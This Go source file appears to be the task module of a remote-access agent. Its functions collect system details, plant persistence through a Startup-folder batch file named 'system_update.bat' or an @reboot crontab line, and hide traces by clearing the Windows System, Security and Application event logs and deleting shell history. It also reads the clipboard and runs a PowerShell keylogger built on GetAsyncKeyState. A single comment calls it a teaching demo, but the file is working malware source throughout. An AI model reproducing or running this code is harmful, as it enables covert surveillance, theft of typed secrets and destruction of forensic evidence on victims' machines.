package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

// taskSysinfo 完整系统信息，与 agent.py task_sysinfo 对齐
// 输出: JSON 字符串，含基础信息 + ip/network/patches/installed_software/cwd/pid
func taskSysinfo(d map[string]interface{}) string {
	info := getSystemInfo()
	info["python_version"] = runtimeInfo() // 复用该字段显示运行时版本
	if cwd, err := os.Getwd(); err == nil {
		info["cwd"] = cwd
	}
	info["pid"] = os.Getpid()

	hostname, _ := os.Hostname()
	if ips, err := net.LookupIP(hostname); err == nil && len(ips) > 0 {
		info["ip"] = ips[0].String()
	} else {
		info["ip"] = "127.0.0.1"
	}

	// 网络信息
	if runtime.GOOS == "windows" {
		info["network"] = runShellCmd("ipconfig", "cmd", 15)
	} else {
		info["network"] = runShellCmd("ifconfig || ip a", "bash", 15)
	}

	// 补丁信息
	if runtime.GOOS == "windows" {
		r := runShellCmd("wmic qfe get HotFixID,InstalledOn /format:csv", "cmd", 15)
		info["patches"] = truncate(strings.TrimSpace(r), 3000)
	} else {
		r := runShellCmd("dpkg -l 2>/dev/null | grep '^ii' | awk '{print $2,$3}' | head -50", "bash", 15)
		info["patches"] = truncate(strings.TrimSpace(r), 3000)
	}

	// 已安装软件
	if runtime.GOOS == "windows" {
		r := runShellCmd("wmic product get Name,Version /format:csv", "cmd", 30)
		info["installed_software"] = truncate(strings.TrimSpace(r), 5000)
	} else {
		r := runShellCmd("dpkg -l 2>/dev/null | grep '^ii' | awk '{print $2,$3}' | head -80", "bash", 15)
		info["installed_software"] = truncate(strings.TrimSpace(r), 5000)
	}

	b, _ := json.MarshalIndent(info, "", "  ")
	return string(b)
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n]
	}
	return s
}

// taskPersistence 持久化，与 agent.py task_persistence 对齐
// 参数: method (startup/cron)
func taskPersistence(d map[string]interface{}) string {
	method := tdGetString(d, "method", "startup")
	exePath, err := os.Executable()
	if err != nil {
		return "[-] 无法获取可执行文件路径: " + err.Error()
	}

	if runtime.GOOS == "windows" {
		if method == "startup" {
			appdata := os.Getenv("APPDATA")
			startupDir := filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
			scriptPath := filepath.Join(startupDir, "system_update.bat")
			content := fmt.Sprintf("@echo off\r\nstart \"\" \"%s\"\r\n", exePath)
			if err := os.WriteFile(scriptPath, []byte(content), 0644); err != nil {
				return "[-] 添加失败: " + err.Error()
			}
			return fmt.Sprintf("[+] 已添加到启动目录: %s", scriptPath)
		}
		return "[-] 不支持的持久化方式"
	}

	// Linux
	if method == "cron" {
		cronLine := fmt.Sprintf("@reboot %s &", exePath)
		// 追加到 crontab
		script := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronLine)
		out := runShellCmd(script, "bash", 10)
		if strings.HasPrefix(out, "[ERROR]") {
			return "[-] 添加失败: " + out
		}
		return "[+] 已添加到crontab定时任务"
	}
	return "[-] 不支持的持久化方式"
}

// taskCleanTrace 清理痕迹，与 agent.py task_clean_trace 对齐
func taskCleanTrace(d map[string]interface{}) string {
	var result []string
	if runtime.GOOS == "windows" {
		for _, cmd := range []string{"wevtutil cl System", "wevtutil cl Security", "wevtutil cl Application"} {
			out := runShellCmd(cmd, "cmd", 15)
			if strings.HasPrefix(out, "[ERROR]") {
				result = append(result, "[-] 日志清理失败: "+cmd)
			}
		}
		if len(result) == 0 {
			result = append(result, "[+] 系统日志已清理")
		}
		// 清理最近访问记录（SystemParametersInfoW 0x0011）
		// 通过 PowerShell 调用
		runShellCmd(`powershell -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern bool SystemParametersInfo(uint u,int v,IntPtr p,uint f);}'; [W]::SystemParametersInfo(0x0011,0,[IntPtr]::Zero,0)"`, "cmd", 10)
		result = append(result, "[+] 最近访问记录已清理")
	} else {
		out := runShellCmd("history -c 2>/dev/null; rm -f ~/.bash_history ~/.zsh_history 2>/dev/null", "bash", 10)
		if strings.HasPrefix(out, "[ERROR]") {
			result = append(result, "[-] 历史清理失败")
		} else {
			result = append(result, "[+] 命令历史已清理")
		}
	}
	return strings.Join(result, "\n")
}

// taskClipboard 读取剪贴板
// Windows: PowerShell Get-Clipboard；Linux: xclip/xsel
func taskClipboard(d map[string]interface{}) string {
	if runtime.GOOS == "windows" {
		out, _, err := runCommandSeparate("powershell", "-NoProfile", "-Command", "Get-Clipboard")
		if err != nil {
			return "[ERROR] " + err.Error()
		}
		out = strings.TrimSpace(out)
		if out == "" {
			return "(clipboard empty)"
		}
		return "[Clipboard Content]\n" + out
	}
	// Linux
	if toolExists("xclip") {
		out, _, err := runCommandSeparate("xclip", "-o", "-selection", "clipboard")
		if err == nil {
			out = strings.TrimSpace(out)
			if out == "" {
				return "(clipboard empty)"
			}
			return "[Clipboard Content]\n" + out
		}
	}
	if toolExists("xsel") {
		out, _, err := runCommandSeparate("xsel", "-o", "-b")
		if err == nil {
			out = strings.TrimSpace(out)
			if out == "" {
				return "(clipboard empty)"
			}
			return "[Clipboard Content]\n" + out
		}
	}
	return "[ERROR] 需要 xclip 或 xsel (Linux): apt install xclip"
}

// taskKeyloggerStart 键盘记录，与 agent.py task_keylogger_start 对齐
// 参数: duration (秒, 默认 30)
// Windows: PowerShell + GetAsyncKeyState；Linux: 暂不支持(需 xinput/evdev)
func taskKeyloggerStart(d map[string]interface{}) string {
	duration := tdGetInt(d, "duration", 30)
	if duration < 1 {
		duration = 30
	}
	if runtime.GOOS != "windows" {
		return "[ERROR] Linux 键盘记录需安装额外工具 (教学演示暂不支持)"
	}
	// PowerShell 键盘记录器（GetAsyncKeyState 轮询）
	script := fmt.Sprintf(`Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v); }
"@
$end = (Get-Date).AddSeconds(%d)
$keys = @()
while ((Get-Date) -lt $end) {
  for ($i=8; $i -le 190; $i++) {
    $s = [K]::GetAsyncKeyState($i)
    if ($s -band 0x8000) {
      try { $keys += ([ConsoleKey]$i).ToString() } catch {}
      Start-Sleep -Milliseconds 40
    }
  }
  Start-Sleep -Milliseconds 30
}
if ($keys.Count -eq 0) { "(无按键记录)" } else { $keys -join ' ' }
`, duration)
	out, _, err := runCommandSeparate("powershell", "-NoProfile", "-Command", script)
	if err != nil {
		return fmt.Sprintf("[ERROR] 键盘记录失败: %v %s", err, out)
	}
	out = strings.TrimSpace(out)
	if out == "" {
		out = "(无按键记录)"
	}
	return fmt.Sprintf("[Keylogger %ds]\n%s", duration, out)
}
